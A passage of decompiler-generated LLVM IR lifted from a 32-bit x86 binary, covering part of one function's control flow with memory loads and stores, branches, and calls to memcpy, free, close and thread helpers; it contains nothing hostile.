  %v3_8056993 = inttoptr i32 %v2_8056993 to i32*
  store i32 %v3_8056990, i32* %v3_8056993, align 4
  %v0_805699a = load i32, i32* @edi, align 4
  %v1_805699a = add i32 %v0_805699a, 32
  %v2_805699a = inttoptr i32 %v1_805699a to i32*
  %v3_805699a = load i32, i32* %v2_805699a, align 4
  store i32 %v3_805699a, i32* %eax.global-to-local, align 4
  %v1_805699d = load i32, i32* @esp, align 4
  %v2_805699d = add i32 %v1_805699d, 148
  %v3_805699d = inttoptr i32 %v2_805699d to i32*
  store i32 %v3_805699a, i32* %v3_805699d, align 4
  %v0_80569a4 = load i32, i32* @edi, align 4
  %v1_80569a4 = add i32 %v0_80569a4, 36
  %v2_80569a4 = inttoptr i32 %v1_80569a4 to i32*
  %v3_80569a4 = load i32, i32* %v2_80569a4, align 4
  store i32 %v3_80569a4, i32* %eax.global-to-local, align 4
  %v1_80569a7 = load i32, i32* @esp, align 4
  %v2_80569a7 = add i32 %v1_80569a7, 152
  %v3_80569a7 = inttoptr i32 %v2_80569a7 to i32*
  store i32 %v3_80569a4, i32* %v3_80569a7, align 4
  %v0_80569ae = load i32, i32* @ecx, align 4
  %v1_80569ae = load i32, i32* @esp, align 4
  %v2_80569ae = add i32 %v1_80569ae, -4
  %v3_80569ae = inttoptr i32 %v2_80569ae to i32*
  store i32 %v0_80569ae, i32* %v3_80569ae, align 4
  %v1_80569af = add i32 %v1_80569ae, -8
  %v2_80569af = inttoptr i32 %v1_80569af to i32*
  store i32 40, i32* %v2_80569af, align 4
  %v1_80569b1 = add i32 %v1_80569ae, 116
  store i32 %v1_80569b1, i32* %edx.global-to-local, align 4
  %v2_80569b5 = add i32 %v1_80569ae, -12
  %v3_80569b5 = inttoptr i32 %v2_80569b5 to i32*
  store i32 %v1_80569b1, i32* %v3_80569b5, align 4
  %v0_80569b6 = load i32, i32* @edi, align 4
  %v2_80569b6 = add i32 %v1_80569ae, -16
  %v3_80569b6 = inttoptr i32 %v2_80569b6 to i32*
  store i32 %v0_80569b6, i32* %v3_80569b6, align 4
  %v4_80569b7 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80569b7, i32* %eax.global-to-local, align 4
  %v0_80569bc = load i32, i32* @edi, align 4
  %v1_80569bc = add i32 %v0_80569bc, 4
  %v2_80569bc = inttoptr i32 %v1_80569bc to i32*
  %v3_80569bc = load i32, i32* %v2_80569bc, align 4
  store i32 %v3_80569bc, i32* %eax.global-to-local, align 4
  %v0_80569bf = load i32, i32* @esp, align 4
  %v1_80569bf = add i32 %v0_80569bf, 16
  %v9_80569c2 = icmp eq i32 %v3_80569bc, 24
  br i1 %v9_80569c2, label %dec_label_pc_8056990.dec_label_pc_80569e9_crit_edge, label %dec_label_pc_80569c7

dec_label_pc_8056990.dec_label_pc_80569e9_crit_edge: ; preds = %dec_label_pc_8056990
  %.pre24 = add i32 %v0_80569bf, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_80569e9.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_80569e9

dec_label_pc_80569c7:                             ; preds = %dec_label_pc_8056990
  %v1_80569c7 = add i32 %v0_80569bc, 28
  %v2_80569c7 = inttoptr i32 %v1_80569c7 to i32*
  %v3_80569c7 = load i32, i32* %v2_80569c7, align 4
  %v4_80569c7 = icmp eq i32 %v3_80569c7, 0
  br i1 %v4_80569c7, label %dec_label_pc_8056a86, label %dec_label_pc_80569d1

dec_label_pc_80569d1:                             ; preds = %dec_label_pc_80569c7
  %v1_80569d1 = add i32 %v0_80569bf, 260
  %v2_80569d1 = inttoptr i32 %v1_80569d1 to i32*
  %v3_80569d1 = load i32, i32* %v2_80569d1, align 4
  %v12_80569d1 = icmp eq i32 %v3_80569d1, 1
  br i1 %v12_80569d1, label %dec_label_pc_80569e9, label %dec_label_pc_80569db

dec_label_pc_80569db:                             ; preds = %dec_label_pc_80569d1
  %v12_80569db = icmp eq i32 %v3_80569d1, 28
  %v1_80569e3 = icmp eq i1 %v12_80569db, false
  br i1 %v1_80569e3, label %dec_label_pc_8056a86, label %dec_label_pc_80569e9

dec_label_pc_80569e9:                             ; preds = %dec_label_pc_8056990.dec_label_pc_80569e9_crit_edge, %dec_label_pc_80569db, %dec_label_pc_80569d1
  %v4_80569e9 = phi i32 [ %v4_80569e9.pre, %dec_label_pc_8056990.dec_label_pc_80569e9_crit_edge ], [ %v3_80569d1, %dec_label_pc_80569db ], [ %v3_80569d1, %dec_label_pc_80569d1 ]
  %v15_80569e9 = icmp eq i32 %v3_80569bc, %v4_80569e9
  br i1 %v15_80569e9, label %dec_label_pc_80569fe, label %dec_label_pc_80569f2

dec_label_pc_80569f2:                             ; preds = %dec_label_pc_80569e9
  %v1_80569f5 = inttoptr i32 %v0_80569bc to i32*
  %v2_80569f5 = load i32, i32* %v1_80569f5, align 4
  %v5_80569f5 = inttoptr i32 %v0_80569bf to i32*
  store i32 %v2_80569f5, i32* %v5_80569f5, align 4
  %v1_80569f7 = call i32 @free(i32 -1)
  store i32 %v1_80569f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a6e

dec_label_pc_80569fe:                             ; preds = %dec_label_pc_80569e9
  %v0_80569fe = load i32, i32* @ebx, align 4
  %v1_8056a00 = sub i32 -1, %v0_80569fe
  store i32 %v1_8056a00, i32* %eax.global-to-local, align 4
  %v2_8056a02 = add i32 %v0_80569bf, 120
  %v3_8056a02 = inttoptr i32 %v2_8056a02 to i32*
  %v4_8056a02 = load i32, i32* %v3_8056a02, align 4
  %v5_8056a02 = add i32 %v4_8056a02, %v1_8056a00
  store i32 %v5_8056a02, i32* %eax.global-to-local, align 4
  %v2_8056a06 = add i32 %v0_80569bc, 36
  %v3_8056a06 = inttoptr i32 %v2_8056a06 to i32*
  store i32 %v5_8056a02, i32* %v3_8056a06, align 4
  %v0_8056a09 = load i32, i32* @edi, align 4
  %v1_8056a09 = add i32 %v0_8056a09, 16
  %v2_8056a09 = inttoptr i32 %v1_8056a09 to i32*
  %v3_8056a09 = load i32, i32* %v2_8056a09, align 4
  %v1_8056a0c = add i32 %v3_8056a09, 4
  store i32 %v1_8056a0c, i32* %eax.global-to-local, align 4
  %v2_8056a0f = add i32 %v0_8056a09, 36
  %v3_8056a0f = inttoptr i32 %v2_8056a0f to i32*
  %v4_8056a0f = load i32, i32* %v3_8056a0f, align 4
  %v7_8056a0f = mul i32 %v4_8056a0f, %v1_8056a0c
  store i32 %v7_8056a0f, i32* %eax.global-to-local, align 4
  %v2_8056a13 = add i32 %v0_8056a09, 32
  %v3_8056a13 = inttoptr i32 %v2_8056a13 to i32*
  %v4_8056a13 = load i32, i32* %v3_8056a13, align 4
  %v6_8056a16 = icmp ugt i32 %v7_8056a0f, %v4_8056a13
  br i1 %v6_8056a16, label %dec_label_pc_80569fe.dec_label_pc_8056a86.loopexit_crit_edge, label %dec_label_pc_8056a18

dec_label_pc_80569fe.dec_label_pc_8056a86.loopexit_crit_edge: ; preds = %dec_label_pc_80569fe
  %v0_8056a86.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056a86

dec_label_pc_8056a18:                             ; preds = %dec_label_pc_80569fe
  store i32 0, i32* %v3_8056a0f, align 4
  %v0_8056a1f = load i32, i32* @esp, align 4
  %v1_8056a1f = add i32 %v0_8056a1f, 27
  %v2_8056a1f = inttoptr i32 %v1_8056a1f to i8*
  store i8 0, i8* %v2_8056a1f, align 1
  %v1_8056a71.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056a71

dec_label_pc_8056a26:                             ; preds = %dec_label_pc_8056985
  %v1_8056a29 = add i32 %v0_8056966, 132
  %v2_8056a29 = inttoptr i32 %v1_8056a29 to i32*
  %v3_8056a29 = load i32, i32* %v2_8056a29, align 4
  %v6_8056a29 = inttoptr i32 %v0_8056966 to i32*
  store i32 %v3_8056a29, i32* %v6_8056a29, align 4
  %v1_8056a30 = call i32 @free(i32 -1)
  store i32 %v1_8056a30, i32* %eax.global-to-local, align 4
  %v0_8056a35 = load i32, i32* @esp, align 4
  %v1_8056a35 = add i32 %v0_8056a35, 16
  %v1_8056a38 = add i32 %v0_8056a35, 260
  %v2_8056a38 = inttoptr i32 %v1_8056a38 to i32*
  %v3_8056a38 = load i32, i32* %v2_8056a38, align 4
  store i32 %v3_8056a38, i32* %eax.global-to-local, align 4
  %v1_8056a3f = add i32 %v0_8056a35, 136
  %v2_8056a3f = inttoptr i32 %v1_8056a3f to i32*
  %v3_8056a3f = load i32, i32* %v2_8056a3f, align 4
  %v15_8056a3f = icmp eq i32 %v3_8056a3f, %v3_8056a38
  %v1_8056a43 = icmp eq i1 %v15_8056a3f, false
  br i1 %v1_8056a43, label %dec_label_pc_8056a71, label %dec_label_pc_8056a45

dec_label_pc_8056a45:                             ; preds = %dec_label_pc_8056a26
  %v0_8056a45 = load i32, i32* @edi, align 4
  %v1_8056a45 = add i32 %v0_8056a45, 16
  %v2_8056a45 = inttoptr i32 %v1_8056a45 to i32*
  %v3_8056a45 = load i32, i32* %v2_8056a45, align 4
  store i32 %v3_8056a45, i32* %eax.global-to-local, align 4
  %v2_8056a48 = add i32 %v0_8056a35, 148
  %v3_8056a48 = inttoptr i32 %v2_8056a48 to i32*
  %v4_8056a48 = load i32, i32* %v3_8056a48, align 4
  %v15_8056a48 = icmp eq i32 %v3_8056a45, %v4_8056a48
  %v1_8056a4f = icmp eq i1 %v15_8056a48, false
  br i1 %v1_8056a4f, label %dec_label_pc_8056b0b, label %dec_label_pc_8056a55

dec_label_pc_8056a55:                             ; preds = %dec_label_pc_8056a45
  %v0_8056a55 = load i32, i32* @edx, align 4
  %v2_8056a55 = add i32 %v0_8056a35, 12
  %v3_8056a55 = inttoptr i32 %v2_8056a55 to i32*
  store i32 %v0_8056a55, i32* %v3_8056a55, align 4
  %v0_8056a56 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a56 = add i32 %v0_8056a35, 8
  %v3_8056a56 = inttoptr i32 %v2_8056a56 to i32*
  store i32 %v0_8056a56, i32* %v3_8056a56, align 4
  %v1_8056a57 = add i32 %v0_8056a35, 152
  %v2_8056a57 = inttoptr i32 %v1_8056a57 to i32*
  %v3_8056a57 = load i32, i32* %v2_8056a57, align 4
  %v5_8056a57 = add i32 %v0_8056a35, 4
  %v6_8056a57 = inttoptr i32 %v5_8056a57 to i32*
  store i32 %v3_8056a57, i32* %v6_8056a57, align 4
  %v0_8056a5e = load i32, i32* %eax.global-to-local, align 4
  %v1_8056a5e = load i32, i32* @edi, align 4
  %v2_8056a5e = add i32 %v1_8056a5e, 36
  %v3_8056a5e = inttoptr i32 %v2_8056a5e to i32*
  %v4_8056a5e = load i32, i32* %v3_8056a5e, align 4
  %v7_8056a5e = mul i32 %v4_8056a5e, %v0_8056a5e
  store i32 %v7_8056a5e, i32* %eax.global-to-local, align 4
  %v2_8056a62 = add i32 %v1_8056a5e, 28
  %v3_8056a62 = inttoptr i32 %v2_8056a62 to i32*
  %v4_8056a62 = load i32, i32* %v3_8056a62, align 4
  %v5_8056a62 = add i32 %v4_8056a62, %v7_8056a5e
  store i32 %v5_8056a62, i32* %eax.global-to-local, align 4
  %v3_8056a65 = inttoptr i32 %v0_8056a35 to i32*
  store i32 %v5_8056a62, i32* %v3_8056a65, align 4
  %v4_8056a66 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80565a4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056a66, i32* %eax.global-to-local, align 4
  %v0_8056a6b = load i32, i32* @edi, align 4
  %v1_8056a6b = add i32 %v0_8056a6b, 36
  %v2_8056a6b = inttoptr i32 %v1_8056a6b to i32*
  %v3_8056a6b = load i32, i32* %v2_8056a6b, align 4
  %v4_8056a6b = add i32 %v3_8056a6b, 1
  store i32 %v4_8056a6b, i32* %v2_8056a6b, align 4
  br label %dec_label_pc_8056a6e

dec_label_pc_8056a6e:                             ; preds = %dec_label_pc_80569f2, %dec_label_pc_8056a55
  %v0_8056a6e = load i32, i32* @esp, align 4
  %v1_8056a6e = add i32 %v0_8056a6e, 16
  br label %dec_label_pc_8056a71

dec_label_pc_8056a71:                             ; preds = %dec_label_pc_8056a26, %dec_label_pc_8056a18, %dec_label_pc_8056a6e
  %v1_8056a71 = phi i32 [ %v1_8056a35, %dec_label_pc_8056a26 ], [ %v1_8056a71.pre, %dec_label_pc_8056a18 ], [ %v1_8056a6e, %dec_label_pc_8056a6e ]
  %v0_8056a71 = load i32, i32* @esi, align 4
  %v2_8056a71 = add i32 %v1_8056a71, 52
  %v3_8056a71 = inttoptr i32 %v2_8056a71 to i32*
  %v4_8056a71 = load i32, i32* %v3_8056a71, align 4
  %v5_8056a71 = add i32 %v4_8056a71, %v0_8056a71
  store i32 %v5_8056a71, i32* @esi, align 4
  %v0_8056a75 = load i32, i32* @ebx, align 4
  %v1_8056a75 = add i32 %v0_8056a75, 1
  store i32 %v1_8056a75, i32* @ebx, align 4
  %v2_8056a76 = add i32 %v1_8056a71, 104
  %v3_8056a76 = inttoptr i32 %v2_8056a76 to i32*
  %v4_8056a76 = load i32, i32* %v3_8056a76, align 4
  %v5_8056a76 = sub i32 %v1_8056a75, %v4_8056a76
  %v11_8056a76 = xor i32 %v4_8056a76, %v1_8056a75
  %v12_8056a76 = xor i32 %v5_8056a76, %v1_8056a75
  %v13_8056a76 = and i32 %v12_8056a76, %v11_8056a76
  %v14_8056a76 = icmp slt i32 %v13_8056a76, 0
  %v16_8056a76 = icmp slt i32 %v5_8056a76, 0
  %v2_8056a7a = icmp eq i1 %v16_8056a76, %v14_8056a76
  br i1 %v2_8056a7a, label %dec_label_pc_8056a86, label %dec_label_pc_8056a7c

dec_label_pc_8056a7c:                             ; preds = %dec_label_pc_8056a7c.lr.ph, %dec_label_pc_8056a71
  %v0_8056a7c = phi i32 [ %v0_8056a7c.pre, %dec_label_pc_8056a7c.lr.ph ], [ %v5_8056a71, %dec_label_pc_8056a71 ]
  %v0_805695267 = phi i32 [ %v1_8056a76.pre, %dec_label_pc_8056a7c.lr.ph ], [ %v1_8056a71, %dec_label_pc_8056a71 ]
  %v2_8056a7c = add i32 %v0_805695267, 16
  %v3_8056a7c = inttoptr i32 %v2_8056a7c to i32*
  %v4_8056a7c = load i32, i32* %v3_8056a7c, align 4
  %v5_8056a7c = sub i32 %v0_8056a7c, %v4_8056a7c
  %v11_8056a7c = xor i32 %v4_8056a7c, %v0_8056a7c
  %v12_8056a7c = xor i32 %v5_8056a7c, %v0_8056a7c
  %v13_8056a7c = and i32 %v12_8056a7c, %v11_8056a7c
  %v14_8056a7c = icmp slt i32 %v13_8056a7c, 0
  %v16_8056a7c = icmp slt i32 %v5_8056a7c, 0
  %v2_8056a80 = icmp eq i1 %v16_8056a7c, %v14_8056a7c
  br i1 %v2_8056a80, label %dec_label_pc_8056a86, label %dec_label_pc_8056952

dec_label_pc_8056a86:                             ; preds = %dec_label_pc_8056975, %dec_label_pc_8056946, %dec_label_pc_8056a71, %dec_label_pc_80569c7, %dec_label_pc_80569db, %dec_label_pc_8056a7c, %dec_label_pc_80569fe.dec_label_pc_8056a86.loopexit_crit_edge
  %v0_8056a86 = phi i32 [ %v0_8056a86.pre.pre, %dec_label_pc_80569fe.dec_label_pc_8056a86.loopexit_crit_edge ], [ %v1_8056a76.pre, %dec_label_pc_8056946 ], [ %v1_8056a71, %dec_label_pc_8056a71 ], [ %v1_80569bf, %dec_label_pc_80569c7 ], [ %v1_80569bf, %dec_label_pc_80569db ], [ %v0_805695267, %dec_label_pc_8056a7c ], [ %v1_8056966, %dec_label_pc_8056975 ]
  %v1_8056a89 = add i32 %v0_8056a86, 20
  %v2_8056a89 = inttoptr i32 %v1_8056a89 to i32*
  %v3_8056a89 = load i32, i32* %v2_8056a89, align 4
  %v5_8056a89 = add i32 %v0_8056a86, -16
  %v6_8056a89 = inttoptr i32 %v5_8056a89 to i32*
  store i32 %v3_8056a89, i32* %v6_8056a89, align 4
  %v1_8056a8d = call i32 @__libc_close(i32 -1)
  store i32 %v1_8056a8d, i32* %eax.global-to-local, align 4
  %v0_8056a92 = load i32, i32* @esp, align 4
  %v1_8056a95 = add i32 %v0_8056a92, 272
  %v2_8056a95 = inttoptr i32 %v1_8056a95 to i32*
  %v3_8056a95 = load i32, i32* %v2_8056a95, align 4
  %v4_8056a95 = icmp eq i32 %v3_8056a95, 0
  br i1 %v4_8056a95, label %dec_label_pc_8056aaa, label %dec_label_pc_8056a9f

dec_label_pc_8056a9f:                             ; preds = %dec_label_pc_8056a86
  store i32 %v3_8056a95, i32* %edx.global-to-local, align 4
  %v2_8056aa6 = inttoptr i32 %v3_8056a95 to i32*
  store i32 %v2_8056516, i32* %v2_8056aa6, align 4
  %v0_8056ab6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056ab6

dec_label_pc_8056aaa:                             ; preds = %dec_label_pc_8056a86
  %v3_8056aad = inttoptr i32 %v0_8056a92 to i32*
  store i32 %v2_8056516, i32* %v3_8056aad, align 4
  %v1_8056aae = call i32 @free(i32 -1)
  store i32 %v1_8056aae, i32* %eax.global-to-local, align 4
  %v0_8056ab3 = load i32, i32* @esp, align 4
  %v1_8056ab3 = add i32 %v0_8056ab3, 16
  br label %dec_label_pc_8056ab6

dec_label_pc_8056ab6:                             ; preds = %dec_label_pc_8056a9f, %dec_label_pc_8056aaa
  %v0_8056ab6 = phi i32 [ %v0_8056ab6.pre, %dec_label_pc_8056a9f ], [ %v1_8056ab3, %dec_label_pc_8056aaa ]
  %v1_8056ab9 = add i32 %v0_8056ab6, 12
  %v2_8056ab9 = inttoptr i32 %v1_8056ab9 to i32*
  %v3_8056ab9 = load i32, i32* %v2_8056ab9, align 4
  %v5_8056ab9 = add i32 %v0_8056ab6, -16
  %v6_8056ab9 = inttoptr i32 %v5_8056ab9 to i32*
  store i32 %v3_8056ab9, i32* %v6_8056ab9, align 4
  %v1_8056abd = call i32 @free(i32 -1)
  store i32 %v1_8056abd, i32* @eax, align 4
  %v0_8056ac2 = load i32, i32* @esp, align 4
  %v1_8056ac5 = add i32 %v0_8056ac2, 8
  %v2_8056ac5 = inttoptr i32 %v1_8056ac5 to i32*
  store i32 ptrtoint (i8** @global_var_8062788.558 to i32), i32* %v2_8056ac5, align 4
  %v1_8056aca = add i32 %v0_8056ac2, 4
  %v2_8056aca = inttoptr i32 %v1_8056aca to i32*
  store i32 134566343, i32* %v2_8056aca, align 4
  %v1_8056acf = add i32 %v0_8056ac2, 200
  store i32 %v1_8056acf, i32* %ebx.global-to-local, align 4
  %v3_8056ad6 = inttoptr i32 %v0_8056ac2 to i32*
  store i32 %v1_8056acf, i32* %v3_8056ad6, align 4
  %v2_8056ad7 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_8056ad7, i32* %eax.global-to-local, align 4
  %v0_8056adc = load i32, i32* @esp, align 4
  %v1_8056adc = inttoptr i32 %v0_8056adc to i32*
  store i32 ptrtoint (i8** @global_var_8062788.558 to i32), i32* %v1_8056adc, align 4
  %v1_8056ae3 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056ae3, i32* %eax.global-to-local, align 4
  %v0_8056ae8 = load i32, i32* @esp, align 4
  %v1_8056ae8 = add i32 %v0_8056ae8, 56
  %v2_8056ae8 = inttoptr i32 %v1_8056ae8 to i32*
  %v3_8056ae8 = load i32, i32* %v2_8056ae8, align 4
  store i32 %v3_8056ae8, i32* @eax, align 4
  %v1_8056aec = add i32 %v0_8056ae8, 60
  %v2_8056aec = inttoptr i32 %v1_8056aec to i32*
  %v3_8056aec = load i32, i32* %v2_8056aec, align 4
  store i32 %v3_8056aec, i32* %edx.global-to-local, align 4
  %v1_8056af0 = inttoptr i32 %v0_8056ae8 to i32*
  %v3_8056af0 = add i32 %v0_8056ae8, 4
  %v1_8056af1 = inttoptr i32 %v3_8056af0 to i32*
  %v1_8056af2 = sext i32 %v3_8056ae8 to i64
  store i64 %v1_8056af2, i64* @global_var_80627a0.559, align 32
  %v1_8056af7 = trunc i32 %v3_8056aec to i16
  store i16 %v1_8056af7, i16* @global_var_805c4e4.560, align 4
  store i32 1, i32* %v1_8056af1, align 4
  %v0_8056b00 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056b00, i32* %v1_8056af0, align 4
  %v2_8056b01 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_8056b01, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056c42

dec_label_pc_8056b0b:                             ; preds = %dec_label_pc_8056a45
  %v1_8056b0e = inttoptr i32 %v0_8056a45 to i32*
  %v2_8056b0e = load i32, i32* %v1_8056b0e, align 4
  %v5_8056b0e = inttoptr i32 %v0_8056a35 to i32*
  store i32 %v2_8056b0e, i32* %v5_8056b0e, align 4
  %v1_8056b10 = call i32 @free(i32 -1)
  store i32 %v1_8056b10, i32* @eax, align 4
  %v0_8056b15 = load i32, i32* @esp, align 4
  %v1_8056b15 = add i32 %v0_8056b15, 16
  br label %dec_label_pc_8056b18

dec_label_pc_8056b18:                             ; preds = %dec_label_pc_805684a, %dec_label_pc_8056975, %dec_label_pc_805696d, %dec_label_pc_8056909, %dec_label_pc_805688f, %dec_label_pc_805686b, %dec_label_pc_8056b0b
  %v1_8056b1f = phi i32 [ %v1_805685f, %dec_label_pc_805684a ], [ %v1_8056966, %dec_label_pc_8056975 ], [ %v1_8056966, %dec_label_pc_805696d ], [ %v1_8056880, %dec_label_pc_8056909 ], [ %v1_8056880, %dec_label_pc_805688f ], [ %v1_8056880, %dec_label_pc_805686b ], [ %v1_8056b15, %dec_label_pc_8056b0b ]
  %v1_8056b18 = add i32 %v1_8056b1f, 51
  %v2_8056b18 = inttoptr i32 %v1_8056b18 to i8*
  %v3_8056b18 = load i8, i8* %v2_8056b18, align 1
  %v4_8056b18 = icmp eq i8 %v3_8056b18, 0
  %v1_8056b1d = icmp eq i1 %v4_8056b18, false
  br i1 %v1_8056b1d, label %dec_label_pc_8056b63, label %dec_label_pc_8056b1f

dec_label_pc_8056b1f:                             ; preds = %dec_label_pc_8056b18
  %v0_8056b1f = load i32, i32* @ecx, align 4
  %v2_8056b1f = add i32 %v1_8056b1f, -4
  %v3_8056b1f = inttoptr i32 %v2_8056b1f to i32*
  store i32 %v0_8056b1f, i32* %v3_8056b1f, align 4
  %v1_8056b20 = add i32 %v1_8056b1f, -8
  %v2_8056b20 = inttoptr i32 %v1_8056b20 to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v2_8056b20, align 4
  %v1_8056b25 = add i32 %v1_8056b1f, -12
  %v2_8056b25 = inttoptr i32 %v1_8056b25 to i32*
  store i32 134566343, i32* %v2_8056b25, align 4
  %v1_8056b2a = add i32 %v1_8056b1f, 184
  store i32 %v1_8056b2a, i32* @esi, align 4
  %v2_8056b31 = add i32 %v1_8056b1f, -16
  %v3_8056b31 = inttoptr i32 %v2_8056b31 to i32*
  store i32 %v1_8056b2a, i32* %v3_8056b31, align 4
  %v2_8056b32 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_8056b32, i32* %eax.global-to-local, align 4
  %v0_8056b37 = load i32, i32* @esp, align 4
  %v1_8056b37 = inttoptr i32 %v0_8056b37 to i32*
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %v1_8056b37, align 4
  %v1_8056b3e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056b3e, i32* %eax.global-to-local, align 4
  %v0_8056b43 = load i32, i32* @global_var_8062bd8.561, align 8
  store i32 %v0_8056b43, i32* %ebx.global-to-local, align 4
  %v0_8056b49 = load i32, i32* @esp, align 4
  %v1_8056b49 = inttoptr i32 %v0_8056b49 to i32*
  %v2_8056b49 = load i32, i32* %v1_8056b49, align 4
  store i32 %v2_8056b49, i32* @eax, align 4
  %v3_8056b49 = add i32 %v0_8056b49, 4
  %v1_8056b4a = inttoptr i32 %v3_8056b49 to i32*
  %v2_8056b4a = load i32, i32* %v1_8056b4a, align 4
  store i32 %v2_8056b4a, i32* %edx.global-to-local, align 4
  %v1_8056b4b = add i32 %v0_8056b43, -1
  store i32 %v1_8056b4b, i32* @ebx, align 4
  store i32 1, i32* %v1_8056b4a, align 4
  %v0_8056b4e = load i32, i32* @esi, align 4
  store i32 %v0_8056b4e, i32* %v1_8056b49, align 4
  %v2_8056b4f = call i32 @__pthread_return_void(i32 -1, i32 %v15_80565a4)
  store i32 %v2_8056b4f, i32* %eax.global-to-local, align 4
  %v0_8056b54 = load i32, i32* @esp, align 4
  %v1_8056b54 = add i32 %v0_8056b54, 16
  %v1_8056b57 = add i32 %v0_8056b54, 52
  %v2_8056b57 = inttoptr i32 %v1_8056b57 to i32*
  %v3_8056b57 = load i32, i32* %v2_8056b57, align 4
  %v4_8056b57 = load i32, i32* @ebx, align 4
  %v5_8056b57 = sub i32 %v3_8056b57, %v4_8056b57
  %v11_8056b57 = xor i32 %v4_8056b57, %v3_8056b57
  %v12_8056b57 = xor i32 %v5_8056b57, %v3_8056b57
  %v13_8056b57 = and i32 %v12_8056b57, %v11_8056b57
  %v14_8056b57 = icmp slt i32 %v13_8056b57, 0
  %v16_8056b57 = icmp slt i32 %v5_8056b57, 0
  %v2_8056b5b = icmp eq i1 %v16_8056b57, %v14_8056b57
  br i1 %v2_8056b5b, label %dec_label_pc_8056b63, label %dec_label_pc_8056b5d

dec_label_pc_8056b5d:                             ; preds = %dec_label_pc_8056b1f
  %v4_8056b5d = add i32 %v3_8056b57, 1
  store i32 %v4_8056b5d, i32* %v2_8056b57, align 4
  br label %dec_label_pc_8056b84.backedge

dec_label_pc_8056b63:                             ; preds = %dec_label_pc_80567ec, %dec_label_pc_8056b1f, %dec_label_pc_8056b18, %dec_label_pc_8056803
  %v1_8056b72 = phi i32 [ %v1_8056b54, %dec_label_pc_8056b1f ], [ %v1_8056b1f, %dec_label_pc_8056b18 ], [ %v1_805683f, %dec_label_pc_8056803 ], [ %v0_8056b63.pre, %dec_label_pc_80567ec ]
  %v1_8056b63 = add i32 %v1_8056b72, 40
  %v2_8056b63 = inttoptr i32 %v1_8056b63 to i32*
  %v3_8056b63 = load i32, i32* %v2_8056b63, align 4
  %v1_8056b67 = add i32 %v3_8056b63, 1
  store i32 %v1_8056b67, i32* %eax.global-to-local, align 4
  %v1_8056b68 = ashr i32 %v1_8056b67, 31
  store i32 %v1_8056b68, i32* %edx.global-to-local, align 4
  %v1_8056b69 = add i32 %v1_8056b72, 248
  %v2_8056b69 = inttoptr i32 %v1_8056b69 to i32*
  %v3_8056b69 = load i32, i32* %v2_8056b69, align 4
  %v5_8056b69 = zext i32 %v1_8056b67 to i64
  %v7_8056b69 = zext i32 %v1_8056b68 to i64
  %v8_8056b69 = mul nuw i64 %v7_8056b69, 4294967296
  %v9_8056b69 = or i64 %v8_8056b69, %v5_8056b69
  %v10_8056b69 = zext i32 %v3_8056b69 to i64
  %v11_8056b69 = sdiv i64 %v9_8056b69, %v10_8056b69
  %v12_8056b69 = trunc i64 %v11_8056b69 to i32
  store i32 %v12_8056b69, i32* %eax.global-to-local, align 4
  %v13_8056b69 = srem i64 %v9_8056b69, %v10_8056b69
  %v14_8056b69 = trunc i64 %v13_8056b69 to i32
  store i32 %v14_8056b69, i32* %edx.global-to-local, align 4
  %v1_8056b70 = icmp eq i32 %v14_8056b69, 0
  store i32 %v14_8056b69, i32* %v2_8056b63, align 4
  %v1_8056b76 = icmp eq i1 %v1_8056b70, false
  br i1 %v1_8056b76, label %dec_label_pc_8056b7c, label %dec_label_pc_8056b78

dec_label_pc_8056b78:                             ; preds = %dec_label_pc_8056b63
  %v0_8056b78 = load i32, i32* @esp, align 4
  %v1_8056b78 = add i32 %v0_8056b78, 28
  %v2_8056b78 = inttoptr i32 %v1_8056b78 to i32*
  %v3_8056b78 = load i32, i32* %v2_8056b78, align 4
  %v4_8056b78 = add i32 %v3_8056b78, 1
  store i32 %v4_8056b78, i32* %v2_8056b78, align 4
  br label %dec_label_pc_8056b7c

dec_label_pc_8056b7c:                             ; preds = %dec_label_pc_8056b63, %dec_label_pc_8056b78
  %v0_8056b7c = load i32, i32* @esp, align 4
  %v1_8056b7c = add i32 %v0_8056b7c, 36
  %v2_8056b7c = inttoptr i32 %v1_8056b7c to i32*
  store i32 -1, i32* %v2_8056b7c, align 4
  br label %dec_label_pc_8056b84.backedge

dec_label_pc_8056b84.backedge:                    ; preds = %dec_label_pc_8056b7c, %dec_label_pc_80567fa, %dec_label_pc_80568e8, %dec_label_pc_8056b5d
  %v0_8056b84.pre = load i32, i32* @esp, align 4
  %v1_8056b84 = add i32 %v0_8056b84.pre, 28
  %v2_8056b84 = inttoptr i32 %v1_8056b84 to i32*
  %v3_8056b84 = load i32, i32* %v2_8056b84, align 4
  %tmp110 = icmp ult i32 %v3_8056b84, 3
  br i1 %tmp110, label %dec_label_pc_80565e4, label %dec_label_pc_8056ba9

dec_label_pc_8056ba9:                             ; preds = %dec_label_pc_805655e, %dec_label_pc_80565fa, %dec_label_pc_80566ee, %dec_label_pc_8056b84.backedge, %entry, %dec_label_pc_8056538, %dec_label_pc_8056540, %dec_label_pc_805654e
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_805654e ], [ -1, %dec_label_pc_8056540 ], [ -1, %dec_label_pc_8056538 ], [ -1, %entry ], [ %v0_80565ab, %dec_label_pc_8056b84.backedge ], [ %v0_80565ab, %dec_label_pc_80566ee ], [ %v0_80565ab, %dec_label_pc_80565fa ], [ %v0_80565ab, %dec_label_pc_805655e ]
